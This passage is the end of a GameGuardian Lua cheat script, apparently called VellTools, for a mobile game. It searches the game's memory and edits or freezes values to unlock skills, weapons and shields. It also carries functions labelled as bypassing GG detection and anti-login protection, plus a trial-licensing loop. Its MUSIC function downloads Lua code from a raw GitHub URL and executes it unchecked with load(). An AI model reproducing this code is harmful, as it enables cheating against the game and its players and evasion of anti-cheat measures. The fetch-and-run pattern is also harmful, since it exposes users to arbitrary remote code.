    local t = gg.getResults(100)
    if t then
        for _, v in ipairs(t) do
            if v.flags == gg.TYPE_DWORD then v.value = "40" v.freeze = true end
        end
        gg.addListItems(t)
    end
    gg.clearResults()
end

function nk() editAreaMap("246;1008981770;1800;1175::") end
function unlishield()
    if not spendCoin() then return end
    gg.setVisible(false)
    gg.clearResults()
    gg.setRanges(gg.REGION_JAVA_HEAP)
    gg.searchNumber("h 08 00 00 00 02 00 00 00 00 00 00 00 00 00 01 00 01 00 00 00", gg.TYPE_BYTE)
    if gg.getResultCount() > 0 then
        gg.refineNumber("8", gg.TYPE_BYTE)
        local results = gg.getResults(100)
        local editTable = {}
        for _, v in ipairs(results) do
            table.insert(editTable, { address = v.address + 12, flags = gg.TYPE_DWORD, value = -1 })
        end
        gg.setValues(editTable)
        gg.toast("Berhasil edit " .. #editTable .. " offset")
    end
end

function rskill()
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    gg.setRanges(gg.REGION_JAVA_HEAP)
    if searchInDalvikMainSpace("3;81;20:9", gg.TYPE_DWORD) then
        gg.refineNumber("3", gg.TYPE_DWORD)
        gg.editAll("25", gg.TYPE_DWORD)
    end
    gg.clearResults()
end

function Lingkage()
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    gg.setRanges(gg.REGION_JAVA_HEAP)
    if searchInDalvikMainSpace("h 1D 00 00 00 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C8 00 00 00 00 00 00 00", gg.TYPE_BYTE) then
        gg.refineNumber("29", gg.TYPE_BYTE)
        local res = gg.getResults(1)
        if res and #res > 0 then
            gg.setValues({{ address = res[1].address + 184, flags = gg.TYPE_BYTE, value = "h 01 00 00 00" }})
            gg.toast("✅ Linkage Activated")
        end
    end
    gg.clearResults()
end

function Wgun()
    if not spendCoin() then return end
    gg.clearResults()
    gg.setVisible(false)
    if searchInDalvikMainSpace("1F;11524;16:97", gg.TYPE_DWORD) then
        gg.refineAddress("C", -1, gg.TYPE_DWORD, gg.SIGN_EQUAL, 0, -1, 0)
        gg.refineNumber("11524", gg.TYPE_DWORD)
        gg.editAll("11001", gg.TYPE_DWORD)
    end
    gg.clearResults()
end

function gsb1() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="10077"}} }}, "Skill Pasir Female", 1) end
function gsb2() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="10083"}} }}, "Skill Buff Light Female", 2) end
function gsb3() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="10084"}} }}, "Skill Buff Fight Female", 3) end
function gsb4() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="10071"}} }}, "Skill Wigs Female", 4) end
function gsb5() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="11305"}} }}, "Bonus Female", 5) end

function gsbbt1() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="10078"}} }}, "Skill Pasir Male", 1) end
function gsbbt2() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="10084"}} }}, "Skill Buff Light Male", 2) end
function gsbbt3() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="10085"}} }}, "Skill Buff Fight Male", 3) end
function gsbbt4() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="10072"}} }}, "Skill Wigs Male", 4) end
function gsbbt5() injectWeaponPattern({{ searchHex = "25769803776Q;6;200;0;1.0F:105", refineNum = "200", edits = {{offset=48, val="11306"}} }}, "Bonus Male", 5) end

function antiLogin()
    gg.clearResults()
    gg.searchNumber("1337;1;0;0::17", gg.TYPE_DWORD)
    gg.refineNumber("1337")
    local r = gg.getResults(10)
    for _, v in ipairs(r) do v.value = "0" v.freeze = true end
    gg.addListItems(r)
    gg.toast("Anti Force Close Login Aktif")
end

function mapStabilizer()
    gg.setVisible(false)
    gg.setRanges(gg.REGION_CODE_APP | gg.REGION_JAVA_HEAP)
    gg.searchNumber("4761214;1162690580::17", gg.TYPE_DWORD)
    gg.clearResults()
    gg.toast("Bypass Deteksi GG & Map Crash Protection Siap")
end

function clearMemory()
    gg.clearResults()
    gg.clearList()
    gg.toast("Memory Game Guardian Dibersihkan")
end

function MUSIC()
    local APIMusic = gg.makeRequest('https://raw.githubusercontent.com/HAISE39/Buat-bro/refs/heads/PVP/Music').content
    if not APIMusic then
        gg.alert('⚠️ You Are Offline or Internet Access Denied ⚠️')
        Back()
    else
        pcall(load(APIMusic))
    end
end

function AI()
    local limitInfo = getTimeLimitInfo()
    local infoText = "⏰ TIME LIMIT INFORMATION\n" .. string.rep("=", 35) .. "\n\n"
    if limitInfo.active then
        infoText = infoText .. "✅ STATUS: ACTIVE\n" ..
                   "📅 Days Left: " .. limitInfo.daysLeft .. " / " .. limitInfo.maxDays .. "\n" ..
                   "🔄 Uses Left: " .. limitInfo.usesLeft .. " / " .. limitInfo.maxUses .. "\n"
    else
        infoText = infoText .. "❌ STATUS: EXPIRED\nHubungi admin untuk perpanjangan."
    end
    gg.alert(infoText)
end

function DungeonCode()
    gg.alert("DESKRIPSI SCRIPT DUNGEON\n\nMinotaur -> Normal (1) -> Hard (10)\nDungeons: 480 Tower, 1606 NK Hard, 1625 NK Expert\nGates: 1316 G4, 1320 G5, 1420 G6, 1562 G7, 1650 G8")
end

function GUIDE() gg.alert("VellTools Guide v2.0 - Visit Discord/Telegram for tutorials.") end
function Agunl() gg.alert("Feature Coming Soon!") end
function anim() gg.alert("Feature Coming Soon!") end
function stamp() gg.alert("Feature Coming Soon!") end
function Exit() os.exit() end

-- ============================================================================
-- 10. MAIN SCRIPT ENTRY POINT & EVENT LOOP
-- ============================================================================

if not timeLimit() then
    gg.alert("⏰ Trial Expired!\n\nScript tidak dapat digunakan.\nHubungi admin untuk perpanjangan.")
    os.exit()
end

HISTORY = { HOME }
MENU_VISIBLE = true

while running do
    if gg.isVisible(true) then
        if not MENU_VISIBLE then
            ShowMenu()
        else
            excAntiHook(targetGGFunc)
            gg.setVisible(false)
            local lastMenu = HISTORY[#HISTORY] or HOME
            lastMenu()
        end
    end
    gg.clearResults()
    gg.sleep(100)
end
